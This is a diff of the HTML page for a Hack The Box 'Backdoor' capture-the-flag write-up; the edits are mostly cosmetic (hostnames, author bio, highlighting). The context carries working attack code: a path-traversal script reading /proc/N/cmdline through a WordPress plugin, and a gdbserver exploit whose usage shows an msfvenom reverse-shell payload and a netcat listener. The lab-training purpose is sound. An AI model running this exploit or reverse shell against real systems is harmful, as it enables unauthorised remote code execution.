@@ -18,14 +18,14 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="bynafrez08.io">
 <meta property="og:title" content="HTB - Backdoor">
-<meta property="og:url" content="http://localhost:4000/htb-backdoor/">
+<meta property="og:url" content="http://0.0.0.0:4000/htb-backdoor/">
 
 
   <meta property="og:description" content="Backdoor is a linux machine with easy level both in explatation phase and PrivEs, in my opinion for me the explatation it’s medium level of difficulty…">
 
 
 
-  <meta property="og:image" content="http://localhost:4000/assets/images/img-backdoor/portada.png">
+  <meta property="og:image" content="http://0.0.0.0:4000/assets/images/img-backdoor/portada.png">
 
 
 
@@ -42,7 +42,7 @@
   
 
 
-<link rel="canonical" href="http://localhost:4000/htb-backdoor/">
+<link rel="canonical" href="http://0.0.0.0:4000/htb-backdoor/">
 
 
 
@@ -55,7 +55,7 @@
       "@context": "https://schema.org",
       "@type": "Person",
       "name": "",
-      "url": "http://localhost:4000",
+      "url": "http://0.0.0.0:4000",
       "sameAs": null
     }
   </script>
@@ -167,7 +167,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="http://0.0.0.0:4000/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1">
         </li>
         <span class="sep">/</span>
@@ -195,18 +195,18 @@
       
 
       
-        <img src="/assets/images/avatar1.png" alt="Nafsu Uddin | AKA bynafrez" itemprop="image">
+        <img src="/assets/images/avatar1.png" alt="bynafrez" itemprop="image">
       
     </div>
   
 
   <div class="author__content">
     
-      <h3 class="author__name" itemprop="name">Nafsu Uddin | AKA bynafrez</h3>
+      <h3 class="author__name" itemprop="name">bynafrez</h3>
     
     
       <p class="author__bio" itemprop="description">
-        Networking / Pentesting / Offensive Security
+        Offensive Security / CTF / Networking / IT enthusiast
       </p>
     
   </div>
@@ -369,19 +369,19 @@
  
 <span class="c1"># python3 wichSystem.py YOURIP 
 </span> 
-<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  
 <span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
  
-    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 %s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
  
-    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
-    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
  
-    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
  
     <span class="k">return</span> <span class="n">ttl_value</span>
  
@@ -398,12 +398,12 @@
  
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  
-    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  
     <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>
  
     <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="si">%</span><span class="s">s (ttl -&gt; </span><span class="si">%</span><span class="s">s): </span><span class="si">%</span><span class="s">s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s (ttl -&gt; %s): %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
 
 </code></pre></div></div>
 
@@ -937,10 +937,10 @@ Interesting Finding(s):
 
 <span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
     <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] Exit...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
 <span class="c1">#ctrl+c
-</span><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>
+</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>
 
 <span class="c1"># Global variable
 </span><span class="n">main_url</span> <span class="o">=</span> <span class="s">"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="</span>
@@ -948,24 +948,24 @@ Interesting Finding(s):
 <span class="k">def</span> <span class="nf">makerequest</span><span class="p">():</span>
      <span class="c1"># loop for check PID
 </span>
-     <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Brute Force attack"</span><span class="p">)</span>
-     <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Starting brute force attack"</span><span class="p">)</span>
+     <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Brute Force attack"</span><span class="p">)</span>
+     <span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Starting brute force attack"</span><span class="p">)</span>
 
-     <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+     <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 
      <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
 
-         <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Trying with PATH /proc/</span><span class="si">%</span><span class="s">s/cmdline"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+         <span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Trying with PATH /proc/%s/cmdline"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
 
          <span class="n">url</span> <span class="o">=</span> <span class="n">main_url</span> <span class="o">+</span> <span class="s">"/proc/"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">+</span> <span class="s">"/cmdline"</span>
 
-         <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+         <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 
-         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">82</span><span class="p">:</span>
+         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">82</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------------------------------"</span><span class="p">)</span>
-             <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PATH: /proc/</span><span class="si">%</span><span class="s">s/cmdline"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
-             <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Total length: </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>
-             <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+             <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PATH: /proc/%s/cmdline"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+             <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Total length: %s"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">))</span>
+             <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
              <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------------------------------"</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
@@ -1004,8 +1004,8 @@ Interesting Finding(s):
 <span class="kn">import</span> <span class="nn">struct</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 
-<span class="n">help</span> <span class="o">=</span> <span class="n">f</span><span class="s">'''
-Usage: python3 {sys.argv[0]} &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;
+<span class="n">help</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'''
+Usage: python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;
 
 Example:
 - Victim's gdbserver   -&gt;  10.10.10.200:1337
@@ -1018,24 +1018,24 @@ $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependF
 $ nc -nlvp 4444
 
 3. Run the exploit:
-$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
+$ python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> 10.10.10.200:1337 rev.bin
 '''</span>
 
 
 <span class="k">def</span> <span class="nf">checksum</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
     <span class="n">res</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span>
-    <span class="k">return</span> <span class="n">f</span><span class="s">'{res:2x}'</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">res</span><span class="si">:</span><span class="mi">2</span><span class="n">x</span><span class="si">}</span><span class="s">'</span>
 
 
 <span class="k">def</span> <span class="nf">ack</span><span class="p">(</span><span class="n">sock</span><span class="p">):</span>
-    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="s">'+'</span><span class="p">)</span>
+    <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'+'</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
-    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="s">'${s}#{checksum(s)}'</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-    <span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">sock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">'$</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s">#</span><span class="si">{</span><span class="n">checksum</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
     <span class="n">ack</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
 
 
 <span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
@@ -1044,49 +1044,49 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 
     <span class="k">try</span><span class="p">:</span>
         <span class="n">res</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'vCont;s'</span><span class="p">)</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">';'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
-        <span class="n">arch</span><span class="p">,</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">';'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">arch</span><span class="p">,</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
     <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
         <span class="k">print</span><span class="p">(</span><span class="s">'[!] ERROR: Unexpected response. Try again later'</span><span class="p">)</span>
         <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
     <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">'10'</span><span class="p">:</span>
         <span class="k">print</span><span class="p">(</span><span class="s">'[+] Found x64 arch'</span><span class="p">)</span>
-        <span class="n">pc</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">pc</span><span class="p">[:</span><span class="n">pc</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">'0*'</span><span class="p">)])</span>
-        <span class="n">pc</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pc</span><span class="p">))</span>
-        <span class="n">addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">pc</span><span class="p">)[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span>
+        <span class="n">pc</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">pc</span><span class="p">[:</span><span class="n">pc</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">'0*'</span><span class="p">)])</span>
+        <span class="n">pc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pc</span><span class="p">))</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">pc</span><span class="p">)[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span>
         <span class="n">addr</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">+</span> <span class="n">addr</span>
     <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">'08'</span><span class="p">:</span>
         <span class="k">print</span><span class="p">(</span><span class="s">'[+] Found x86 arch'</span><span class="p">)</span>
-        <span class="n">pc</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">pc</span><span class="p">)</span>
-        <span class="n">pc</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pc</span><span class="p">))</span>
-        <span class="n">addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">pc</span><span class="p">)[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span>
+        <span class="n">pc</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">pc</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pc</span><span class="p">))</span>
+        <span class="n">addr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">pc</span><span class="p">)[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span>
         <span class="n">addr</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">+</span> <span class="n">addr</span>
 
     <span class="n">hex_length</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
 
     <span class="k">print</span><span class="p">(</span><span class="s">'[+] Sending payload'</span><span class="p">)</span>
-    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">f</span><span class="s">'M{addr},{hex_length}:{payload}'</span><span class="p">)</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="sa">f</span><span class="s">'M</span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">hex_length</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
     <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">'vCont;c'</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
         <span class="k">print</span><span class="p">(</span><span class="n">help</span><span class="p">)</span>
         <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-    <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
-    <span class="nb">file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+    <span class="nb">file</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
 
     <span class="k">try</span><span class="p">:</span>
         <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-            <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="nb">hex</span><span class="p">()</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="nb">hex</span><span class="p">()</span>
     <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'[!] ERROR: File {file} not found'</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[!] ERROR: File </span><span class="si">{</span><span class="nb">file</span><span class="si">}</span><span class="s"> not found'</span><span class="p">)</span>
         <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
-        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
+    <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
+        <span class="n">sock</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
         <span class="k">print</span><span class="p">(</span><span class="s">'[+] Connected to target. Preparing exploit'</span><span class="p">)</span>
         <span class="n">exploit</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
         <span class="k">print</span><span class="p">(</span><span class="s">'[*] Pwned!! Check your listener'</span><span class="p">)</span>
@@ -1297,7 +1297,7 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
   </ul>
 </div>
 
-<div class="page__footer-copyright">© 2022 bynafrez08.io</div>
+<div class="page__footer-copyright">© 2025 bynafrez08.io</div>
 
       </footer>
     </div>
